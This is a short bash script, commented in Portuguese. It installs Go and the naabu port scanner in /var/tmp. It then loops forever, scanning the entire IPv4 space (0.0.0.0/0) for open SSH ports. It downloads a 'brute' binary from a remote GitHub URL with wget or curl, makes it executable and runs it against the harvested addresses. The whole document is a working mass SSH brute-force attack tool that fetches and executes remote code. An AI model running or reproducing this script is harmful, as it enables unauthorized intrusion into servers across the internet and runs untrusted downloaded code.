#ATILA_VKZMN

#abaixa brute golang naabu


go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'

url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'

url_brute='https://github.com/atilabyte/golang/raw/refs/heads/master/brute' 





brute() {

#execute brute && nabu  in targets ssh

cd /var/tmp 

cd go/bin

cd  *.1/cmd/naabu


# pegando sempre a versao mais recente da brute


wget $url_brute -O brute || curl -L $url_brute -o brute


chmod +x brute nabu  || chmod 777 brute nabu


timeout  60s     ./nabu  -p 22 -host  0.0.0.0/0   > ips     #60  segundos para  pega os ips


timeout  1000s  sh -c  ./brute   #1000 segundos pra testa os ips


}




install_(){




while  true ; do 


sleep   1



out=$( ls /var/tmp/go/bin/naabu-2.6.1/cmd/naabu/nabu ) #verify if nabu instaled
 

if (( ! $? )) ; then 

echo nabu ja foi instalado

brute

else

cd /var/tmp

wget $go_url  -O go.gz || curl -L $go_url  -o  go.gz

tar -xf  go.gz
 
cd go ; cd bin 

wget $url_naabu  -O naabu.gz || curl -L $url_naabu -o naabu.gz


tar -xf naabu.gz


cd  *.1/cmd/naabu 

mv main.go nabu.go

 ../../.././go build nabu.go


fi ;


done


}








install_

